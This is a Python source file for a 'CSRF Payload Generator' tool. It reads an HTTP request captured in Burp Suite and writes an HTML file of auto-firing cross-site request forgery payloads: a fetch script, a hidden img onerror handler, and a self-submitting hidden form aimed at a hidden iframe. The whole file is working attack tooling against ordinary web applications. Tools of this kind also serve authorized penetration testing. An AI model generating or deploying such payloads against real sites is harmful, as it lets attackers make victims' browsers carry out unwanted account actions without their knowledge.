import sys
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

def print_logo():
    """
    Print a logo or tool name at the start of the script.
    """
    logo = f"""
    {Fore.CYAN}============================
     {Fore.YELLOW}CSRF Payload Generator v1.0
       {Fore.GREEN}by Abutalib Zarban
    {Fore.CYAN}============================
    """
    print(logo)

def parse_burp_request(file_path):
    """
    Parse an HTTP request saved from Burp Suite.

    :param file_path: Path to the HTTP request file
    :return: Dictionary containing method, full URL, headers, and body
    """
    with open(file_path, 'r') as f:
        lines = f.readlines()

    if not lines:
        raise ValueError(f"{Fore.RED}The HTTP request file is empty.{Style.RESET_ALL}")

    # Parse the request line (first line of the HTTP request)
    request_line = lines[0].strip()
    parts = request_line.split(" ", 2)

    if len(parts) < 2:
        raise ValueError(f"{Fore.RED}Invalid request line: {request_line}. Expected format: METHOD URL HTTP_VERSION{Style.RESET_ALL}")

    method = parts[0]
    url = parts[1]
    http_version = parts[2] if len(parts) > 2 else "HTTP/1.1"

    headers = {}
    body = ""
    parsing_headers = True

    # Parse headers and body
    for line in lines[1:]:
        line = line.strip()
        if line == "":
            parsing_headers = False  # Empty line separates headers and body
            continue
        if parsing_headers:
            if ":" in line:
                key, value = line.split(":", 1)
                headers[key.strip()] = value.strip()
            else:
                print(f"{Fore.RED}Skipping malformed header line: {line}{Style.RESET_ALL}")
        else:
            body += line

    # Determine protocol and form the full URL
    host = headers.get("Host", "")
    if not host:
        raise ValueError(f"{Fore.RED}Host header is missing in the HTTP request.{Style.RESET_ALL}")

    # Ask for protocol if not determinable
    protocol = "http://"
    if ":443" in host:
        protocol = "https://"
    elif ":80" in host:
        protocol = "http://"
    else:
        protocol = input(f"{Fore.YELLOW}Protocol for host '{host}' not specified. Enter 'http://' or 'https://': {Style.RESET_ALL}").strip()
        if protocol not in ["http://", "https://"]:
            raise ValueError(f"{Fore.RED}Invalid protocol specified.{Style.RESET_ALL}")

    full_url = f"{protocol}{host}{url}"

    return {
        "method": method,
        "url": full_url,
        "headers": headers,
        "body": body
    }

def generate_csrf_payload(request_data, method):
    """
    Generate CSRF payloads using various methods.

    :param request_data: Parsed HTTP request data
    :param method: Selected method for payload generation
    :return: Payload for the selected method
    """
    request_method = request_data["method"]
    url = request_data["url"]
    body = request_data["body"]

    # Ignore the body if the method is GET
    if request_method == "GET":
        body = ""

    query_string = body if body else ""

    if method == "fetch":
        if request_method == "GET":
            return f"""
<script>
fetch("{url}", {{
    method: "{request_method}"
}});
</script>
"""
        else:
            return f"""
<script>
fetch("{url}", {{
    method: "{request_method}",
    headers: {{
        "Content-Type": "application/x-www-form-urlencoded"
    }},
    body: "{query_string}"
}});
</script>
"""
    elif method == "onerror":
        return f"""
<img src="" onerror="fetch('{url}', {{
    method: '{request_method}',
    headers: {{
        'Content-Type': 'application/x-www-form-urlencoded'
    }}{", body: '" + query_string + "'" if request_method != "GET" else ""}
}})" style="display:none;">
"""
    elif method == "form":
        inputs = "\n".join(
            f'<input type="hidden" name="{key}" value="{value}">'
            for key, value in [param.split("=") for param in query_string.split("&")]
        )
        return f"""
<form action="{url}" method="{request_method}" target="hidden_iframe">
    {inputs}
    <script>
        document.forms[0].submit();
    </script>
</form>
<iframe name="hidden_iframe" style="display:none;"></iframe>
"""
    else:
        return None

def generate_html(payloads, output_file="csrf_payloads.html"):
    """
    Generate an HTML file containing the CSRF payloads.

    :param payloads: Dictionary of CSRF payloads
    :param output_file: File name for the HTML output
    """
    html_content = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Payloads</title>
</head>
<body>
    <h1>Generated CSRF Payloads</h1>
"""

    for method, payload in payloads.items():
        html_content += f"""
    <h2>{method.capitalize()} Payload</h2>
    <div>
        <pre>{payload}</pre>
    </div>
    <hr>
"""

    html_content += """
</body>
</html>
"""

    with open(output_file, "w") as f:
        f.write(html_content)

    print(f"{Fore.GREEN}HTML file with CSRF payloads saved as: {output_file}{Style.RESET_ALL}")

def main():
    print_logo()  # Print the logo or tool name at the start

    if len(sys.argv) != 2:
        print(f"{Fore.RED}Usage: python csrf_generator.py <burp_request_file>{Style.RESET_ALL}")
        sys.exit(1)

    file_path = sys.argv[1]

    try:
        # Parse the Burp request
        request_data = parse_burp_request(file_path)

        # Ask user for payload generation method
        print(f"{Fore.YELLOW}Select the method(s) for CSRF payload generation:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}1.{Style.RESET_ALL} fetch")
        print(f"{Fore.CYAN}2.{Style.RESET_ALL} onerror")
        print(f"{Fore.CYAN}3.{Style.RESET_ALL} form")
        print(f"{Fore.CYAN}4.{Style.RESET_ALL} All")
        choice = input(f"{Fore.YELLOW}Enter your choice (e.g., 1, 2, 3, 4): {Style.RESET_ALL}").strip()

        methods = {
            "1": "fetch",
            "2": "onerror",
            "3": "form",
            "4": "all"
        }

        if choice not in methods:
            print(f"{Fore.RED}Invalid choice. Exiting.{Style.RESET_ALL}")
            sys.exit(1)

        # Generate payloads
        selected_methods = [methods[choice]] if choice != "4" else ["fetch", "onerror", "form"]
        csrf_payloads = {method: generate_csrf_payload(request_data, method) for method in selected_methods}

        # Generate HTML output
        generate_html(csrf_payloads)

    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    main()
